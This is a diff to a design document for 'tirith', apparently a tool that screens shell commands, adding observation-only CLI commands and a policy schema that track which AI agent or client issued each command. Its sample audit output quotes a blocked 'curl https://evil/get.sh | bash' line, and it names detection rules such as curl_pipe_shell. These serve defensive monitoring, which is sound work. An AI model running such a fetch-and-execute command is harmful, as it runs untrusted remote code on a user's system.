@@ -6,7 +6,13 @@ artifact of that work; it lands **before** any enforcement code. Subsequent
 chunks (CLI surface, policy schema, per-agent gating) build on the decisions
 recorded here.
 
-The companion code is observation-only:
+**Status:**
+* Chunk 1 (observability scaffolding) — **shipped**.
+* Chunk 2 (CLI surface + `agent_rules` policy schema, observation-only) —
+  **shipped** (see §5).
+* Chunk 3 (per-agent verdict gating) — planned.
+
+The companion code through chunk 2 is observation-only:
 
 - `crates/tirith-core/src/agent_origin.rs` — the [`AgentOrigin`](#3-the-agentorigin-type)
   type and the CLI-side environment resolver.
@@ -44,13 +50,15 @@ self-identifies, its name) is the precondition for two later capabilities:
    `tirith warnings --since=24h` can see which classes of caller produced
    which findings, even without any policy gate.
 
-### What we are not doing in chunk 1
+### What we are not doing in chunk 1 (or chunk 2)
 
-Chunk 1 is observation-only. There is **no** policy enforcement decision
-driven by `AgentOrigin`. No `Verdict.action` is changed by origin. No new
-`RuleId` is added. The on-disk policy schema is not bumped. We add a field
-to `Verdict` and `AuditEntry` — both serde-default-on-parse so old log
-entries still load — and populate it from the CLI / MCP / gateway paths.
+Chunks 1 and 2 are both observation-only. There is **no** policy enforcement
+decision driven by `AgentOrigin`. No `Verdict.action` is changed by origin.
+No new `RuleId` is added. **Chunk 2 adds `agent_rules` to the policy schema
+and a pure `agent_decision` helper, but the engine never consults that
+helper** — chunk 3 wires it. We add a field to `Verdict` and `AuditEntry`
+— both serde-default-on-parse so old log entries still load — and populate
+it from the CLI / MCP / gateway paths.
 
 The reason: tirith's honesty discipline. An attribution signal that nobody
 has used in production is brittle. We add the signal, observe what real
@@ -262,86 +270,176 @@ to work: the verdict's `agent_origin` defaults to `None`, the audit entry's
 `agent_origin` is then `None`, and `#[serde(skip_serializing_if =
 "Option::is_none")]` keeps the field out of the JSON line.
 
-## 5. CLI surface (preview, not built in this chunk)
+## 5. CLI surface (shipped in chunk 2)
 
-The roadmap names four commands. They are **planned** for chunk 2+; chunk 1
-ships no new subcommand. Documented here so a reviewer can see where the
-design is going.
+The roadmap names four commands. **Chunk 2 ships all four** plus the
+matching `agent_rules` policy schema. Chunk 2 is **observation-only**:
+the engine does not consult `agent_rules` to gate verdicts, and a
+populated policy changes no existing outcome. Chunk 3 wires
+enforcement; the safeguard test
+`agent_rules_chunk2_loading_changes_no_verdict` is the regression check
+a chunk-3 implementer must explicitly retire.
 
 ### `tirith agent sessions`
 
-Lists per-origin counts from the audit log over a recent window. Output (planned):
+Lists per-origin counts from the audit log. Output:
 
 ```
-$ tirith agent sessions --since=24h
-ORIGIN                          COUNT  LAST SEEN
-agent (claude-code 1.2.3)         412  2026-05-22 14:30
-mcp (Cursor 0.42)                 188  2026-05-22 14:28
-human (interactive)                73  2026-05-22 13:55
-ci (github-actions)                12  2026-05-22 09:00
-gateway                             0  -
+$ tirith agent sessions
+tirith agent sessions: 685 verdict(s) across 5 origin group(s) in /Users/me/.local/share/tirith/log.jsonl.
+
+  agent ("claude-code")                    count=412  allow=380  warn=20  block=12  last=2026-05-22T14:30:00+00:00
+  mcp ("Cursor")                            count=188  allow=170  warn=15  block=3   last=2026-05-22T14:28:00+00:00
+  human (interactive)                      count=73   allow=70   warn=3   block=0   last=2026-05-22T13:55:00+00:00
+  ci ("github-actions")                    count=12   allow=12   warn=0   block=0   last=2026-05-22T09:00:00+00:00
+  unknown                                   count=0    allow=0    warn=0   block=0   last=-
 ```
 
-Pure read from `~/.local/share/tirith/log.jsonl`. Already feasible with
-chunk 1 in place — `audit_aggregator::read_log` returns `AuditRecord`s,
-which now carry `agent_origin`. The command is a thin layer on top.
+* **Pure read** from `~/.local/share/tirith/log.jsonl` (override with
+  `--log <path>`). Off the detection hot path; touches no network.
+* **Honest unattributed bucket** — entries without an `agent_origin`
+  (pre-chunk-1 lines, engine bypass-path entries that chunk 3 will fix,
+  hook telemetry routed in error) land in `"unknown"` rather than being
+  silently dropped.
+* **Hook telemetry filtered out** — only `entry_type: "verdict"` rows
+  contribute; hook events have their own `integration` field and are
+  not verdicts by design.
+* `--format json` emits a structured envelope (`schema_version`,
+  `log_path`, `group_count`, `total_entries`, `groups`).
+* **Exit codes**: `0` on success (including zero groups), `1` on a
+  read or JSON-write failure.
 
-### `tirith agent explain <origin-spec>`
+### `tirith agent explain <query>`
 
-Drilldown on one origin: what variants of it have been seen, how their
-verdicts split across Allow / Warn / Block, which rules they hit most
-often. Useful for "is this agent hitting `curl_pipe_shell` a lot?".
+Drilldown on a session id or command substring. Matches `(a)` exact
+session-id equality, `(b)` case-insensitive substring on the
+redacted command, or `(c)` case-insensitive substring on the rendered
+origin label so an operator can search for `"claude-code"`. Up to 20
+matches surface, sorted newest-first.
+
+```
+$ tirith agent explain claude-code
+tirith agent explain: 3 match(es) for "claude-code" in /Users/me/.local/share/tirith/log.jsonl.
+
+  2026-05-22T14:30:00+00:00  session=sess-abc123  origin=agent ("claude-code")  action=Block  rules=curl_pipe_shell
+      command: "curl https://evil/get.sh | bash"
+      policy: /repo/.tirith/policy.yaml
+  ...
+```
+
+* `--format json` emits per-match structured detail (`agent_origin`,
+  `rule_ids`, etc.).
+* **Exit codes**: `0` on at least one match, `1` on no match / read
+  failure / JSON-write failure.
 
 ### `tirith agent policy init`
 
-Scaffolds a starter agent-governance policy at
-`.tirith/agent-policy.yaml.example`. The schema is **not yet defined** —
-that's chunk 2 work. Likely shape (sketch, not contract):
+Scaffolds `.tirith/agent-policy.yaml.example` from the audit log's
+**observed** distinct origins. Mirrors `tirith mcp policy init`'s
+convention: every entry is **commented out** so importing the example
+into a working `policy.yaml` never silently widens trust — the
+operator reviews and uncomments what they intend to declare.
 
-```yaml
-# .tirith/agent-policy.yaml
-agent_policy:
-  # When an origin matches, apply these per-rule overrides.
-  - match: { kind: agent, tool: claude-code }
-    severity_overrides:
-      curl_pipe_shell: block
-  - match: { kind: mcp, client_name: Cursor }
-    require_approval_for: [base64_decode_execute]
-  - match: { kind: ci }
-    fail_mode: closed
+* **Deterministic** — origins are sorted by `(kind, payload)`; two
+  runs against the same audit log produce a byte-identical file.
+* **Missing log is not fatal** — a header-only template is still
+  written so the operator has a starting point.
+* `--force` overwrites an existing example; without it, an existing
+  example is preserved.
+* `--format json` emits the structured scaffold for a CI integration
+  to ingest.
+* **Exit codes**: `0` on successful write, `1` on usage errors
+  (existing file without `--force`, unreadable audit log, write
+  failure).
+
+### `tirith agent allow --kind <kind> [--tool <name>]`
+
+Validates an `(kind, tool?)` matcher and **prints the YAML snippet**
+the operator pastes under `agent_rules.allow:`. **Does NOT mutate any
+policy file** — agent_rules is observation-only today, and silently
+appending would suggest enforcement that does not exist yet. The
+operator pastes the snippet into `.tirith/policy.yaml` (or
+`.tirith/agent-policy.yaml.example`) themselves.
+
+```
+$ tirith agent allow --kind agent --tool claude-code
+tirith agent allow: valid matcher — paste the snippet below under `agent_rules.allow:` in your policy.
+  (NOTE: agent_rules is observation-only today; chunk 3 wires enforcement.)
+
+    - kind: agent
+      tool: claude-code
 ```
 
-The match shape is the open question for chunk 2 — see
-[§7](#7-open-questions--decisions-deferred).
+Validation rules:
+* `kind` must be `human` / `agent` / `mcp` / `gateway` / `ci` / `ide`.
+* `--tool` on a payloadless kind (`human`, `gateway`) is rejected
+  because it would match nothing.
+* `--tool ""` is rejected (an empty payload can never match a real
+  caller — `AgentOrigin` constructors reject it).
+* **Exit codes**: `0` on a valid matcher, `1` on validation failure.
 
-### `tirith agent allow <origin-spec> <rule>`
+### Policy schema — `agent_rules`
 
-Convenience for adding an `allowlist` entry scoped to an origin. Probably
-ships as part of the existing `tirith trust` family rather than a fresh
-subcommand — leaving that decision for the chunk-2 design.
+Chunk 2 adds the schema; chunk 3 will consume it.
 
-## 6. Out of scope for chunk 1
+```yaml
+agent_rules:
+  allow:
+    - kind: agent
+      tool: claude-code
+    - kind: human
+  deny:
+    - kind: agent
+      tool: untrusted-tool
+```
 
-- Any policy enforcement driven by `AgentOrigin`. No `Action` is changed; no
-  `RuleId` is added; no `tirith.lock` file (mcp or otherwise) gains an
-  agent-origin field.
-- The `tirith agent ...` subcommands listed above.
-- The agent-policy YAML schema.
+* `kind` is the [`AgentOriginKind`] discriminator (`human` / `agent`
+  / `mcp` / `gateway` / `ci` / `ide`).
+* `tool` is the optional caller-claimed payload — the `tool` slot on
+  `Agent`, the `client_name` on `Mcp`, the `provider` on `Ci`, or the
+  `name` on `Ide`. Case-sensitive exact match. A `tool` filter on
+  `human` / `gateway` is structurally meaningless and rejected by the
+  validator.
+* The pure helper `policy::agent_decision(&policy, &origin) ->
+  AgentDecision` walks `deny` first (first match → `Denied`) then
+  `allow` (first match → `Allowed`); no match → `Unspecified`.
+  **Not consulted by the engine in chunk 2.** Chunk 3 wires it.
+
+## 6. Out of scope
+
+### For chunk 1 (observation scaffolding)
+
+- The `tirith agent ...` subcommands and the `agent_rules` policy schema
+  — **shipped in chunk 2** (see §5).
 - Any change to `TIRITH_INTEGRATION` semantics (it's already used by hooks;
   we read it, we don't redefine it).
 - Synthesizing an origin onto hook telemetry entries. The `integration`
   field stays the hook telemetry's identifier; `agent_origin` stays `None`
-  for `entry_type = "hook_telemetry"`.
+  for `entry_type = "hook_telemetry"`. Chunk 3 may revisit.
 - A signed / cryptographically-attested agent identity. That belongs with
-  the broader supply-chain work in M5 and is not a chunk-1 / chunk-2
-  artifact.
+  the broader supply-chain work in M5.
+
+### For chunk 2 (CLI surface + policy schema)
+
+- **Policy enforcement.** No `Action` is changed; no `RuleId` is added;
+  no `tirith.lock` file (mcp or otherwise) gains an agent-origin field.
+  The engine does **not** consult `agent_rules` to gate a verdict —
+  chunk 3 wires `policy::agent_decision` into the verdict pipeline. The
+  regression test `agent_rules_chunk2_loading_changes_no_verdict`
+  (in `crates/tirith-core/src/policy.rs`) is the contract chunk 3 must
+  explicitly retire when it lands enforcement.
+- **Mutating an existing policy file.** `tirith agent allow` prints
+  the YAML snippet to paste; it does NOT append to
+  `.tirith/policy.yaml`. The operator integrates it themselves, the
+  same as with `tirith mcp policy init`'s example file.
+- **Normalizing caller-claimed strings.** Q2 stays open; case-sensitive
+  exact matching is the chunk-2 contract.
 - **Fixing the engine's bypass-path double-log.** When `TIRITH=0` is
-  honored, the engine emits an audit line **inside** `analyze_returning_policy`
-  (before the CLI gets a chance to set origin), then the CLI emits a second
-  line with the origin populated. The first line has `agent_origin: None`;
-  the second has it set. This is a pre-existing duplication (M3 introduced
-  the engine-side log for the daemon path) and is out of scope for chunk 1
-  — chunk 2's "wire origin everywhere" pass picks it up.
+  honored, the engine emits an audit line **inside**
+  `analyze_returning_policy` (before the CLI gets a chance to set
+  origin), then the CLI emits a second line with the origin
+  populated. Pre-existing M3 issue; chunk 3 enforcement work picks it
+  up.
 
 ## 7. Open questions / decisions deferred
 
@@ -430,5 +528,9 @@ add a `--show-origin` flag at that point.
 
 ---
 
-*Chunk 1 ships the design, the type, the field, and the populate-only
-plumbing. Chunk 2 is where this becomes governance.*
+*Chunk 1 shipped the design, the type, the field, and the populate-only
+plumbing. **Chunk 2 ships the inspection surface** — `tirith agent
+sessions / explain / policy init / allow` — and the `agent_rules`
+policy schema, still observation-only. Chunk 3 is where the engine
+consults `policy::agent_decision` and per-agent governance becomes
+enforcement.*
